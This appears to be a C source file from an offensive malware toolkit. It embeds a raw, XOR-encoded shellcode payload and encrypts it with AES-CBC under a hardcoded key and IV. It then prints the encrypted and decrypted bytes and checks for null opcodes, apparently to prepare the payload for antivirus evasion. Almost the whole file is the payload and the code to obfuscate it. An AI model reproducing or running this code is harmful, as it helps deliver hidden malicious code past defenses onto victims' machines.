#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#include "aes.hpp"

unsigned char shellcode[] = "\x31\xc9\x31\xd2\x66\x81\xc2\xbc\x01\xeb\x1a\x5b\x39\xca\x74\x13\x31\xc0\x02\x04\x0b\x34\x29\x2c\x06\x34\x43\x8d\x3c\x0b\x88\x07\x41\xeb\xe9\xff\xe3\xe8\xe1\xff\xff\xff\x35\xf9\x85\xef\x9c\x58\x51\xb9\x04\xe7\x09\x50\xe7\x37\x7c\xe7\x37\x74\xe7\x77\xe7\x77\xe7\x37\x70\xf9\x0d\xec\xe7\x2f\xac\x61\x88\xe7\x20\x68\x61\x88\xe7\x30\x4c\x61\xb6\xf9\x35\xe8\xe7\x68\x40\x61\x8b\xf9\x6d\x94\xe7\x10\x44\x61\x8a\xf9\x15\x90\x51\x92\x32\x18\x1e\x05\x1f\x1f\x18\x0f\x21\x04\x04\x18\x14\x30\x1e\x1b\x02\x2a\x23\x05\x02\x32\xf9\x05\x9c\x51\xa0\xe7\x6d\x94\xe7\x15\x9c\x51\xb9\xec\xe7\xac\xe3\x61\x8b\x02\xef\xa1\x7b\x9f\xc2\x14\x6f\x20\x87\x83\xe7\x35\x90\xe7\x3d\xe8\x51\x92\x02\xe7\x54\x2e\xe7\x74\xd1\x61\xb6\xf9\x35\x98\x51\xb9\x31\x18\x01\x1e\x69\x21\x18\x3c\x19\x0e\x1e\x18\x3c\x1b\x01\x04\x34\x3f\xeb\xbe\x51\xb9\x31\x02\x29\x1c\x1c\x02\x31\x18\x5f\x5e\x5a\x04\x18\x13\x1f\x5e\x0b\x34\xeb\xb0\xf9\x25\x84\x51\xb9\x31\x02\x29\x15\x10\x02\x31\x18\x14\x01\x1e\x14\x18\x33\x3f\x21\x3f\x34\x30\xe7\x35\x98\xeb\xbe\x51\xb9\x02\x29\xf0\x61\x59\xbc\x34\x02\x29\x6e\x6e\x31\xeb\xb0\x51\xb9\x31\x02\x29\x14\x21\x02\x31\x18\x1b\x0f\x07\x05\x18\x33\x3f\x21\x3f\x34\xe7\x3d\x84\x31\xe7\x3d\x98\xeb\xb1\x51\xb9\x31\x31\x31\xd1\x62\x31\xd1\x61\x31\x21\x31\xeb\xb0\xf9\x25\x80\x51\xb9\x31\x18\x05\x0f\x14\x01\x02\xef\x1c\x44\x6f\x01\x18\x0f\x1b\x1a\x1a\x34\xe7\x3d\x84\x31\xe7\x3d\x98\xeb\xb1\x18\xa0\xd8\x61\xbe\x51\xb9\x02\x29\x71\x0c\x02\x31\x51\xb9\xe0\xa1\x6e\x02\x31\xf9\x8e\x51\xb9\x06\x70\x3e\xe7\x3d\x80\x31\xeb\xb0\x51\xb9\x31\x02\x29\x1f\x21\x02\x31\x18\x1b\x0f\x05\x1f\x18\x14\x05\x30\x1e\x18\x2f\x1e\x05\x01\x34\xe7\x3d\xec\x31\xe7\x3d\x98\xeb\xb1\xf9\x25\x8c\x18\x0f\x1d\x04\x01\x02\xef\x1c\x44\x6f\x01\xf9\x81\x51\xbe\xef\x9c\x70\xf9\x8f\xe7\x6d\x80\x33\x33\x33\x3e\x3e\x51\xa0\x20\xa1\xa0\x78\x30\x3e\x3e\x3e\x3e\x3e\x3e\x3e\x3e\x3e\x3e\x51\xa0\x64\x24\x30\xf9\x80\x3f\x30\x3e\x3e\x3e\x51\xa0\x20\x30\x3e\x3e\x31\x3e\xe7\x3d\x8c\xeb\xb1\xf9\x9c\x0d\xaf";

void encryptShellcode(unsigned char*, int);

int main(int argc, char* argv[]) {

	printf("%d", strlen((char*)shellcode));
	encryptShellcode(shellcode, strlen((char*)shellcode));

	return 0;
}

void encryptShellcode(unsigned char* stringPointer, int size) {
	struct AES_ctx ctx;

	uint8_t key[] = "ñdkfmcjeprkjgjll";
	uint8_t iv[] = "bbbbbbbbbbbbbbbb";

	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_encrypt_buffer(&ctx, stringPointer, size);

	printf("\n\nEncrypted buffer: ");

	for (int i = 0; i < size; i++) {
		unsigned char opcode = *(unsigned char*)((DWORD)shellcode + i);

		if (opcode == 0x0) printf("NULL opcode found");
		printf("\\x%x", opcode);
	}

	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, stringPointer, size);

	printf("\n\nDecrypted buffer: ");

	for (int i = 0; i < size; i++) {
		unsigned char opcode = *(unsigned char*)((DWORD)shellcode + i);

		if (opcode == 0x0) printf("NULL opcode found");
		printf("\\x%x", opcode);
	}
}
